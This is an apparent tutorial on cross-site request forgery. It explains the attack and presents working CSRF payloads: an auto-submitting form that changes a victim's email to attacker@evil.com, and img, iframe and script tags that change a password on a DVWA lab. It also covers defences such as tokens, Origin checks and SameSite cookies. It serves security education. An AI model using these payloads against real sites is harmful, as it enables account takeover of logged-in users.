# Cross-site Request Forgery (CSRF / XSRF)

Cross-site Request Forgery (CSRF) is a web security attack where an attacker tricks an authenticated user into performing unwanted actions on a web application where they are logged in.

### üìå How CSRF Works

An attacker creates a malicious form or script that automatically submits a request to a vulnerable website using the victim‚Äôs authentication cookies.

### Example:
    
    <form action="https://vulnerable-website.com/email/change" method="POST">
        <input type="hidden" name="email" value="attacker@evil.com" />
    </form>
    
    <script>
        document.forms[0].submit();
    </script>


If the victim is logged in, the browser automatically includes cookies ‚Üí the request is accepted as legitimate.

###  CSRF Prevention Methods

- Use unique CSRF tokens in forms and validate them on the server.

- Check the Referer or Origin header.

- Use SameSite cookie attribute to block cross-site cookie sending.

- Require non-simple requests using JavaScript fetch() with custom headers.

### üìù Example: CSRF Token in a Form
    <form action="/transfer" method="POST">
        <input type="hidden" name="amount" value="100" />
        <input type="hidden" name="csrf_token" value="random-generated-token" />
        <button type="submit">Transfer</button>
    </form>

### üî• CSRF Trigger Tags

Attackers use specific HTML tags to trigger CSRF automatically when the victim loads a malicious page.

  Below are common examples (using DVWA).

 1. <img> Tag ‚Äî Simple GET Request Trigger

          <img src="http://192.168.1.45/dvwa/vulnerabilities/csrf/?password_new=password123&password_conf=password123&Change=Change">


    Loads automatically and sends the request.

 2. <iframe> Tag ‚Äî Hidden Auto-Trigger

          <iframe src="http://192.168.1.45/dvwa/vulnerabilities/csrf/?password_new=password123&password_conf=password123&Change=Change"></iframe>


    Often hidden with zero width/height to avoid detection.

 3. <script> Tag ‚Äî Loads JavaScript From Target

           <script type="text/javascript" src="http://192.168.1.45/dvwa/vulnerabilities/csrf/?password_new=password123&password_conf=password123&Change=Change"></script>


    Useful when the endpoint returns valid JavaScript.

### Why These Work and Limitations
Browsers fetch these resources cross-origin without CORS blocks for simple requests, attaching session cookies automatically. They fail against CSRF tokens, POST-only endpoints requiring custom headers, or `SameSite=Strict` cookies. For POSTs, attackers combine with `<form>` and JavaScript auto-submit.

### Same Site Cookies
SameSite cookies refer to an HTTP cookie attribute that controls whether cookies are sent with cross-site requests, helping mitigate attacks like CSRF and enhancing privacy by distinguishing first-party (same-site) from third-party contexts.

### Attribute Values
* **Strict**: Cookies are sent only for same-site requests, blocking them entirely on cross-site navigation or subrequests for maximum security.
* **Lax**: Cookies are withheld on cross-site subrequests (e.g., images, scripts) but sent for top-level GET navigations like link clicks; this is the default in most browsers if unspecified.
* **None**: Allows cookies in all cross-site contexts but requires the Secure flag and HTTPS; used for third-party features like analytics or embeds.

### Key Benefits
SameSite reduces cross-site request forgery (CSRF) by limiting when browsers include cookies in requests from external sites. It also aligns with modern browser policies, where Lax is increasingly default to balance usability and security. Developers set it via the `Set-Cookie` header, e.g., `Set-Cookie: key=value; SameSite=Lax`.

